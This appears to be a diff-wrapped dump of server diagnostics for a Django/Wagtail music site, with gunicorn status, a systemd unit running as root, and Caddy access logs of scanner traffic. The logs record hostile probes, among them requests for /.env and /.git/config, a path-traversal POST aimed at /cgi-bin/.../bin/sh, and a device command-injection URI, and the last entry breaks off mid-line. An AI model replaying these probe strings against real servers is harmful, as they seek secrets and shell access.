+lication --bind 127.0.0.1:8081 --workers 3 --timeout 120
+             ├─3301233 /root/TopQuaranta_Local/venv/bin/python3 /root/TopQuaranta_Local/venv/bin/gunicorn tqcms.wsgi:app\
+lication --bind 127.0.0.1:8081 --workers 3 --timeout 120
+             └─3301234 /root/TopQuaranta_Local/venv/bin/python3 /root/TopQuaranta_Local/venv/bin/gunicorn tqcms.wsgi:app\
+lication --bind 127.0.0.1:8081 --workers 3 --timeout 120
+
+Oct 08 20:57:00 topquaranta-server gunicorn[3301230]: [2025-10-08 20:57:00 +0000] [3301230] [INFO] Starting gunicorn 23.\
+0.0
+Oct 08 20:57:00 topquaranta-server gunicorn[3301230]: [2025-10-08 20:57:00 +0000] [3301230] [INFO] Listening at: http://\
+127.0.0.1:8081 (3301230)
+Oct 08 20:57:00 topquaranta-server gunicorn[3301230]: [2025-10-08 20:57:00 +0000] [3301230] [INFO] Using worker: sync
+Oct 08 20:57:00 topquaranta-server gunicorn[3301232]: [2025-10-08 20:57:00 +0000] [3301232] [INFO] Booting worker with p\
+id: 3301232
+Oct 08 20:57:00 topquaranta-server gunicorn[3301233]: [2025-10-08 20:57:00 +0000] [3301233] [INFO] Booting worker with p\
+id: 3301233
+Oct 08 20:57:00 topquaranta-server gunicorn[3301234]: [2025-10-08 20:57:00 +0000] [3301234] [INFO] Booting worker with p\
+id: 3301234
+Oct 08 21:00:00 topquaranta-server gunicorn[3301233]: [WARNING] 2025-10-08 23:00:00,000 django.request: Not Found: /admi\
+n/pending_artists/
+Oct 08 21:00:00 topquaranta-server gunicorn[3301233]: [WARNING] 2025-10-08 23:00:00,000 django.request: Not Found: /admi\
+n/pending_artists/
+Oct 08 21:00:25 topquaranta-server gunicorn[3301234]: [WARNING] 2025-10-08 23:00:25,570 django.request: Not Found: /admi\
+n/pending_artists/
+Oct 08 21:00:25 topquaranta-server gunicorn[3301234]: [WARNING] 2025-10-08 23:00:25,570 django.request: Not Found: /admi\
+n/pending_artists/
+---- systemctl cat topquaranta_web.service ----
+# /etc/systemd/system/topquaranta_web.service
+[Unit]
+Description=TopQuaranta - Wagtail (Django) public site
+After=network.target
+
+[Service]
+User=root
+Group=root
+WorkingDirectory=/root/TopQuaranta_Local/web_cms
+Environment="DJANGO_SETTINGS_MODULE=tqcms.settings.production"
+Environment="PYTHONUNBUFFERED=1"
+ExecStart=/root/TopQuaranta_Local/venv/bin/gunicorn tqcms.wsgi:application --bind 127.0.0.1:8081 --workers 3 --timeout 1\
+20
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+
+==== 📜 Logs recents (gunicorn/caddy) ====
+Oct 08 11:21:41 topquaranta-server caddy[2211644]: {"level":"info","ts":1759922501.4311416,"logger":"tls.cache.maintenan\
+ce","msg":"updated and stored ACME renewal information","identifiers":["topquaranta.cat"],"cert_hash":"69827b325e335dd4a\
+3b239fa8d7e59e00f0b2d256e62859208782427eb86abc1","ari_unique_id":"jw0TovYuftFQbDMYOF1ZjiNykco.BsId8m3fv0zg60K8v0k9fMLP",\
+"cert_expiry":1764764751,"selected_time":1762194926,"next_update":1759944101.4284508,"explanation_url":""}
+Oct 08 11:21:41 topquaranta-server caddy[2211644]: {"level":"info","ts":1759922501.5671911,"msg":"got renewal info","nam\
+es":["www.topquaranta.cat"],"window_start":1762096198,"window_end":1762251647,"selected_time":1762137644,"recheck_after"\
+:1759944101.5671754,"explanation_url":""}
+Oct 08 11:21:41 topquaranta-server caddy[2211644]: {"level":"info","ts":1759922501.5694172,"logger":"tls.cache.maintenan\
+ce","msg":"updated and stored ACME renewal information","identifiers":["www.topquaranta.cat"],"cert_hash":"b963af8e8eb12\
+25ffc2912f6e86283953b876601f66384bb8d6ca20beb3dc7cb","ari_unique_id":"jw0TovYuftFQbDMYOF1ZjiNykco.BpGZcnY7pEFPf3uhjx36lE\
+BV","cert_expiry":1764764753,"selected_time":1762161214,"next_update":1759944101.5671754,"explanation_url":""}
+Oct 08 11:37:20 topquaranta-server caddy[2211644]: {"level":"info","ts":1759923440.6543467,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"185.117.225.235","remote_port":"58314","client_ip":"185.117.225.235","prot\
+o":"HTTP/1.1","method":"GET","host":"app.wamoca.com","uri":"/robots.txt","headers":{"User-Agent":["python-requests/2.31.\
+0"],"Accept-Encoding":["gzip, deflate"],"Accept":["*/*"],"Connection":["keep-alive"]}},"bytes_read":0,"user_id":"","dura\
+tion":0.000058834,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://a\
+pp.wamoca.com/robots.txt"],"Content-Type":[]}}
+Oct 08 11:37:21 topquaranta-server caddy[2211644]: {"level":"info","ts":1759923441.2249207,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"185.117.225.235","remote_port":"58316","client_ip":"185.117.225.235","prot\
+o":"HTTP/1.1","method":"GET","host":"app.wamoca.com","uri":"/","headers":{"Accept-Encoding":["gzip, deflate"],"Connectio\
+n":["keep-alive"],"Pragma":["no-cache"],"Cache-Control":["no-cache"],"Upgrade-Insecure-Requests":["1"],"User-Agent":["Mo\
+zilla/5.0 (compatible; BitSightBot/1.0)"],"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,im\
+age/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"]}},"bytes_read":0,"user_id":"","duration":0.000022\
+878,"size":0,"status":308,"resp_headers":{"Location":["https://app.wamoca.com/"],"Content-Type":[],"Server":["Caddy"],"C\
+onnection":["close"]}}
+Oct 08 11:39:21 topquaranta-server caddy[2211644]: {"level":"info","ts":1759923561.032689,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"195.178.110.15","remote_port":"36372","client_ip":"195.178.110.15","proto":\
+"HTTP/1.1","method":"GET","host":"","uri":"/","headers":{}},"bytes_read":0,"user_id":"","duration":0.000207184,"size":0,\
+"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https:///"],"Content-Type":[]}}
+Oct 08 11:39:21 topquaranta-server caddy[2211644]: {"level":"info","ts":1759923561.066426,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"195.178.110.15","remote_port":"36380","client_ip":"195.178.110.15","proto":\
+"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/","headers":{"Connection":["close"],"User-Agent":["l9tcpid/v1.1\
+.0"]}},"bytes_read":0,"user_id":"","duration":0.000028099,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Conn\
+ection":["close"],"Location":["https://188.245.60.20/"],"Content-Type":[]}}
+Oct 08 11:46:59 topquaranta-server caddy[2211644]: {"level":"info","ts":1759924019.2575512,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"196.251.87.141","remote_port":"61709","client_ip":"196.251.87.141","proto"\
+:"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/.env","headers":{"User-Agent":["Mozilla/5.0 (X11; Linux x86_64\
+) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"],"Accept-Encoding":["gzip, deflate"],"Accep\
+t":["*/*"],"Connection":["keep-alive"]}},"bytes_read":0,"user_id":"","duration":0.000092781,"size":0,"status":308,"resp_\
+headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/.env"],"Content-Type":[]}}
+Oct 08 12:23:55 topquaranta-server caddy[2211644]: {"level":"info","ts":1759926235.1301394,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"204.76.203.219","remote_port":"40750","client_ip":"204.76.203.219","proto"\
+:"HTTP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{"Connection":["keep-alive"],"Content-Type":["a\
+pplication/x-www-form-urlencoded; charset=UTF-8"],"Accept-Language":["en US,en;q=0.9,sv;q=0.8"],"Accept-Encoding":["gzip\
+, deflate","gzip, deflate"],"Accept":["*/*"],"X-Requested-With":["XMLHttpRequest"],"User-Agent":["Mozilla/5.0 (Windows N\
+T 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"]}},"bytes_\
+read":0,"user_id":"","duration":0.000239592,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["clos\
+e"],"Location":["https://188.245.60.20/"],"Content-Type":[]}}
+Oct 08 12:24:53 topquaranta-server caddy[2211644]: {"level":"info","ts":1759926293.5952404,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"213.209.157.162","remote_port":"58146","client_ip":"213.209.157.162","prot\
+o":"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/.git/HEAD","headers":{"Connection":["close"],"User-Agent":["\
+Mozilla/5.0 (Linux; Android 8.1.0; Mi Note 3 Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4\
+.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044813 Mobile Safari/537.36 MMWEBID/6858 MicroMessenger/7.0.5.1440(0x27000537\
+) Process/tools NetType/4G Language/zh_CN"],"Accept-Charset":["utf-8"],"Accept-Encoding":["gzip"]}},"bytes_read":0,"user\
+_id":"","duration":0.000037318,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location\
+":["https://188.245.60.20/.git/HEAD"],"Content-Type":[]}}
+Oct 08 12:31:23 topquaranta-server caddy[2211644]: {"level":"info","ts":1759926683.3269565,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"213.209.157.162","remote_port":"35408","client_ip":"213.209.157.162","prot\
+o":"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/.git/HEAD","headers":{"Connection":["close"],"User-Agent":["\
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27"],"Accept-Cha\
+rset":["utf-8"],"Accept-Encoding":["gzip"]}},"bytes_read":0,"user_id":"","duration":0.000065724,"size":0,"status":308,"r\
+esp_headers":{"Content-Type":[],"Server":["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/.git/HEAD"]\
+}}
+Oct 08 12:32:04 topquaranta-server caddy[2211644]: {"level":"info","ts":1759926724.821632,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"115.231.78.11","remote_port":"30000","client_ip":"115.231.78.11","proto":"H\
+TTP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{"Accept":["*/*"],"Connection":["keep-alive"],"Use\
+r-Agent":["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36"]}},"b\
+ytes_read":0,"user_id":"","duration":0.000024108,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":[\
+"close"],"Location":["https://188.245.60.20/"],"Content-Type":[]}}
+Oct 08 12:32:05 topquaranta-server caddy[2211644]: {"level":"info","ts":1759926725.2349336,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"115.231.78.11","remote_port":"42224","client_ip":"115.231.78.11","proto":"\
+HTTP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{"Accept-Encoding":["gzip"],"User-Agent":["Mozill\
+a/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"],"Ac\
+cept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.000017184,"size":0,"status":308,"resp_headers":{"Server":["Cadd\
+y"],"Connection":["close"],"Location":["https://188.245.60.20/"],"Content-Type":[]}}
+Oct 08 12:32:08 topquaranta-server caddy[2211644]: {"level":"info","ts":1759926728.1891296,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"115.231.78.11","remote_port":"42468","client_ip":"115.231.78.11","proto":"\
+HTTP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/favicon.ico","headers":{"Accept-Encoding":["gzip"],"User-Agen\
+t":["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU \
+360SE"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.00004121,"size":0,"status":308,"resp_headers":{"Serv\
+er":["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/favicon.ico"],"Content-Type":[]}}
+Oct 08 12:32:09 topquaranta-server caddy[2211644]: {"level":"info","ts":1759926729.5059497,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"115.231.78.11","remote_port":"43445","client_ip":"115.231.78.11","proto":"\
+HTTP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/robots.txt","headers":{"User-Agent":["Mozilla/5.0 (Windows NT\
+ 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"],"Accept":["*/*"],"Ac\
+cept-Encoding":["gzip"]}},"bytes_read":0,"user_id":"","duration":0.000031433,"size":0,"status":308,"resp_headers":{"Conn\
+ection":["close"],"Location":["https://188.245.60.20/robots.txt"],"Content-Type":[],"Server":["Caddy"]}}
+Oct 08 12:32:15 topquaranta-server caddy[2211644]: {"level":"info","ts":1759926735.0485744,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"185.226.197.73","remote_port":"46089","client_ip":"185.226.197.73","proto"\
+:"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/","headers":{"Accept-Encoding":["gzip"],"User-Agent":["Mozilla\
+/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"],"Accept":\
+["*/*"]}},"bytes_read":0,"user_id":"","duration":0.000024922,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"C\
+onnection":["close"],"Location":["https://188.245.60.20/"],"Content-Type":[]}}
+Oct 08 12:39:37 topquaranta-server caddy[2211644]: {"level":"info","ts":1759927177.9810011,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"137.184.173.236","remote_port":"55778","client_ip":"137.184.173.236","prot\
+o":"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/.env","headers":{"User-Agent":["Mozilla/5.0; Keydrop.io/1.0(\
+onlyscans.com/about);"],"Accept":["*/*"],"Accept-Encoding":["gzip"]}},"bytes_read":0,"user_id":"","duration":0.000120002\
+,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/.env\
+"],"Content-Type":[]}}
+Oct 08 12:39:38 topquaranta-server caddy[2211644]: {"level":"info","ts":1759927178.1792314,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"137.184.173.236","remote_port":"55786","client_ip":"137.184.173.236","prot\
+o":"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/.git/config","headers":{"User-Agent":["Mozilla/5.0; Keydrop.\
+io/1.0(onlyscans.com/about);"],"Accept":["*/*"],"Accept-Encoding":["gzip"]}},"bytes_read":0,"user_id":"","duration":0.00\
+0047713,"size":0,"status":308,"resp_headers":{"Location":["https://188.245.60.20/.git/config"],"Content-Type":[],"Server\
+":["Caddy"],"Connection":["close"]}}
+Oct 08 12:45:29 topquaranta-server caddy[2211644]: {"level":"info","ts":1759927529.6356456,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"34.38.82.158","remote_port":"54958","client_ip":"34.38.82.158","proto":"HT\
+TP/1.1","method":"GET","host":"188.245.60.20","uri":"/","headers":{"Accept":["*/*"],"Connection":["keep-alive"],"User-Ag\
+ent":["python-requests/2.32.5"],"Accept-Encoding":["gzip, deflate"]}},"bytes_read":0,"user_id":"","duration":0.000044903\
+,"size":0,"status":308,"resp_headers":{"Location":["https://188.245.60.20/"],"Content-Type":[],"Server":["Caddy"],"Conne\
+ction":["close"]}}
+Oct 08 13:06:23 topquaranta-server caddy[2211644]: {"level":"info","ts":1759928783.6936119,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"204.76.203.212","remote_port":"60930","client_ip":"204.76.203.212","proto"\
+:"HTTP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{"Accept":["*/*"],"X-Requested-With":["XMLHttpR\
+equest"],"Content-Type":["application/x-www-form-urlencoded; charset=UTF-8"],"Accept-Language":["en US,en;q=0.9,sv;q=0.8\
+"],"Accept-Encoding":["gzip, deflate","gzip, deflate"],"Connection":["keep-alive"],"User-Agent":["Mozilla/5.0 (Windows N\
+T 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"]}},"bytes_\
+read":0,"user_id":"","duration":0.000090394,"size":0,"status":308,"resp_headers":{"Content-Type":[],"Server":["Caddy"],"\
+Connection":["close"],"Location":["https://188.245.60.20/"]}}
+Oct 08 13:28:01 topquaranta-server caddy[2211644]: {"level":"info","ts":1759930081.1530542,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"91.224.92.17","remote_port":"46328","client_ip":"91.224.92.17","proto":"HT\
+TP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{}},"bytes_read":0,"user_id":"","duration":0.000116\
+547,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/"\
+],"Content-Type":[]}}
+Oct 08 13:38:54 topquaranta-server caddy[2211644]: {"level":"info","ts":1759930734.203063,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"176.65.132.111","remote_port":"42238","client_ip":"176.65.132.111","proto":\
+"HTTP/1.1","method":"GET","host":"world.hana-api.com","uri":"/","headers":{"User-Agent":["Mozilla/5.0 (Linux; Android 6.\
+0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36"]}},"bytes_read":0\
+,"user_id":"","duration":0.000314631,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Lo\
+cation":["https://world.hana-api.com/"],"Content-Type":[]}}
+Oct 08 13:45:21 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931121.2235107,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"195.178.110.109","remote_port":"36978","client_ip":"195.178.110.109","prot\
+o":"HTTP/1.1","method":"GET","host":"","uri":"/","headers":{}},"bytes_read":0,"user_id":"","duration":0.000047628,"size"\
+:0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https:///"],"Content-Type":[]}}
+Oct 08 13:45:21 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931121.2541502,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"195.178.110.109","remote_port":"36980","client_ip":"195.178.110.109","prot\
+o":"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/","headers":{"User-Agent":["l9tcpid/v1.1.0"],"Connection":["\
+close"]}},"bytes_read":0,"user_id":"","duration":0.000045039,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"C\
+onnection":["close"],"Location":["https://188.245.60.20/"],"Content-Type":[]}}
+Oct 08 13:45:41 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931141.533246,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"204.76.203.233","remote_port":"54262","client_ip":"204.76.203.233","proto":\
+"HTTP/1.1","method":"CONNECT","host":"ipv4.icanhazip.com:443","uri":"ipv4.icanhazip.com:443","headers":{"User-Agent":["G\
+o-http-client/1.1"]}},"bytes_read":0,"user_id":"","duration":0.000020474,"size":0,"status":308,"resp_headers":{"Server":\
+["Caddy"],"Connection":["close"],"Location":["https://ipv4.icanhazip.com/"],"Content-Type":[]}}
+Oct 08 13:46:41 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931201.7719798,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"198.98.53.110","remote_port":"52200","client_ip":"198.98.53.110","proto":"\
+HTTP/1.1","method":"POST","host":"188.245.60.20:80","uri":"/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bi\
+n/sh","headers":{"Upgrade-Insecure-Requests":["1"],"User-Agent":["libredtail-http"],"Connection":["keep-alive"],"Content\
+-Type":["text/plain"],"Content-Length":["181"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.000045874,"si\
+ze":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/cgi-bin/\
+.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"],"Content-Type":[]}}
+Oct 08 13:48:54 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931334.1943445,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"43.165.70.220","remote_port":"40290","client_ip":"43.165.70.220","proto":"\
+HTTP/1.1","method":"GET","host":"app.wamoca.com","uri":"/","headers":{"Connection":["keep-alive","close"],"Pragma":["no-\
+cache"],"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,appl\
+ication/signed-exchange;v=b3;q=0.7"],"Accept-Encoding":["gzip"],"Accept-Language":["zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"\
+],"Upgrade-Insecure-Requests":["1"],"User-Agent":["Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/\
+605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"],"Cache-Control":["no-cache"]}},"bytes_read":0,"\
+user_id":"","duration":0.000106723,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Loca\
+tion":["https://app.wamoca.com/"],"Content-Type":[]}}
+Oct 08 13:51:26 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931486.4809787,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"172.235.181.217","remote_port":"60056","client_ip":"172.235.181.217","prot\
+o":"HTTP/1.0","method":"GET","host":"","uri":"/","headers":{}},"bytes_read":0,"user_id":"","duration":0.000040111,"size"\
+:0,"status":308,"resp_headers":{"Location":["https:///"],"Content-Type":[],"Server":["Caddy"],"Connection":["close"]}}
+Oct 08 13:52:02 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931522.0397093,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"172.235.181.217","remote_port":"39822","client_ip":"172.235.181.217","prot\
+o":"HTTP/1.1","method":"GET","host":"static.20.60.245.188.clients.your-server.de","uri":"/","headers":{"Connection":["cl\
+ose"],"User-Agent":["Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML"]}},"bytes_read":0,"user_id":"",\
+"duration":0.000018485,"size":0,"status":308,"resp_headers":{"Content-Type":[],"Server":["Caddy"],"Connection":["close"]\
+,"Location":["https://static.20.60.245.188.clients.your-server.de/"]}}
+Oct 08 13:52:02 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931522.0398915,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"172.235.181.217","remote_port":"39854","client_ip":"172.235.181.217","prot\
+o":"HTTP/1.1","method":"GET","host":"static.20.60.245.188.clients.your-server.de","uri":"/webui","headers":{"User-Agent"\
+:["Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML"],"Connection":["close"]}},"bytes_read":0,"user_id\
+":"","duration":0.000006734,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":[\
+"https://static.20.60.245.188.clients.your-server.de/webui"],"Content-Type":[]}}
+Oct 08 13:52:02 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931522.0400207,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"172.235.181.217","remote_port":"39850","client_ip":"172.235.181.217","prot\
+o":"HTTP/1.1","method":"GET","host":"static.20.60.245.188.clients.your-server.de","uri":"/","headers":{"User-Agent":["Mo\
+zilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML"],"Connection":["close"]}},"bytes_read":0,"user_id":"",\
+"duration":0.000008989,"size":0,"status":308,"resp_headers":{"Connection":["close"],"Location":["https://static.20.60.24\
+5.188.clients.your-server.de/"],"Content-Type":[],"Server":["Caddy"]}}
+Oct 08 13:52:02 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931522.2077253,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"172.235.181.217","remote_port":"39868","client_ip":"172.235.181.217","prot\
+o":"HTTP/1.1","method":"GET","host":"static.20.60.245.188.clients.your-server.de","uri":"/","headers":{"User-Agent":["Mo\
+zilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML"],"Connection":["close"]}},"bytes_read":0,"user_id":"",\
+"duration":0.000020789,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["http\
+s://static.20.60.245.188.clients.your-server.de/"],"Content-Type":[]}}
+Oct 08 13:52:02 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931522.2081444,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"172.235.181.217","remote_port":"39862","client_ip":"172.235.181.217","prot\
+o":"HTTP/1.1","method":"GET","host":"static.20.60.245.188.clients.your-server.de","uri":"/favicon.ico","headers":{"Conne\
+ction":["close"],"User-Agent":["Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML"]}},"bytes_read":0,"u\
+ser_id":"","duration":0.000033918,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Locat\
+ion":["https://static.20.60.245.188.clients.your-server.de/favicon.ico"],"Content-Type":[]}}
+Oct 08 13:52:02 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931522.3927364,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"172.235.181.217","remote_port":"39874","client_ip":"172.235.181.217","prot\
+o":"HTTP/1.1","method":"GET","host":"static.20.60.245.188.clients.your-server.de","uri":"/owa/","headers":{"Connection":\
+["close"],"User-Agent":["Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML"]}},"bytes_read":0,"user_id"\
+:"","duration":0.000023129,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["\
+https://static.20.60.245.188.clients.your-server.de/owa/"],"Content-Type":[]}}
+Oct 08 13:52:02 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931522.5430288,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"172.235.181.217","remote_port":"39888","client_ip":"172.235.181.217","prot\
+o":"HTTP/1.1","method":"GET","host":"static.20.60.245.188.clients.your-server.de","uri":"/owa/","headers":{"User-Agent":\
+["Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML"],"Connection":["close"]}},"bytes_read":0,"user_id"\
+:"","duration":0.00003638,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["h\
+ttps://static.20.60.245.188.clients.your-server.de/owa/"],"Content-Type":[]}}
+Oct 08 13:52:12 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931532.14868,"logger":"http.log.access","msg\
+":"handled request","request":{"remote_ip":"172.235.181.217","remote_port":"40302","client_ip":"172.235.181.217","proto"\
+:"HTTP/1.0","method":"GET","host":"","uri":"/","headers":{}},"bytes_read":0,"user_id":"","duration":0.000035185,"size":0\
+,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https:///"],"Content-Type":[]}}
+Oct 08 13:52:12 topquaranta-server caddy[2211644]: {"level":"info","ts":1759931532.1803057,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"172.235.181.217","remote_port":"40316","client_ip":"172.235.181.217","prot\
+o":"HTTP/1.1","method":"GET","host":"static.20.60.245.188.clients.your-server.de","uri":"/","headers":{}},"bytes_read":0\
+,"user_id":"","duration":0.0000373,"size":0,"status":308,"resp_headers":{"Content-Type":[],"Server":["Caddy"],"Connectio\
+n":["close"],"Location":["https://static.20.60.245.188.clients.your-server.de/"]}}
+Oct 08 14:01:06 topquaranta-server caddy[2211644]: {"level":"info","ts":1759932066.6644197,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"63.34.11.203","remote_port":"50882","client_ip":"63.34.11.203","proto":"HT\
+TP/1.0","method":"HEAD","host":"188.245.60.20","uri":"/","headers":{"Accept-Charset":["ISO-8859-1,utf-8;q=0.7,*;q=0.7"],\
+"Accept":["text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"],"Accept\
+-Encoding":["identity"],"User-Agent":["Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"],"Accept-L\
+anguage":["en-gb,en;q=0.5"],"Connection":["close"]}},"bytes_read":0,"user_id":"","duration":0.000079695,"size":0,"status\
+":308,"resp_headers":{"Content-Type":[],"Server":["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/"]}\
+}
+Oct 08 14:16:39 topquaranta-server caddy[2211644]: {"level":"info","ts":1759932999.3455899,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"144.172.106.240","remote_port":"58496","client_ip":"144.172.106.240","prot\
+o":"HTTP/1.1","method":"POST","host":"188.245.60.20:80","uri":"/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&m\
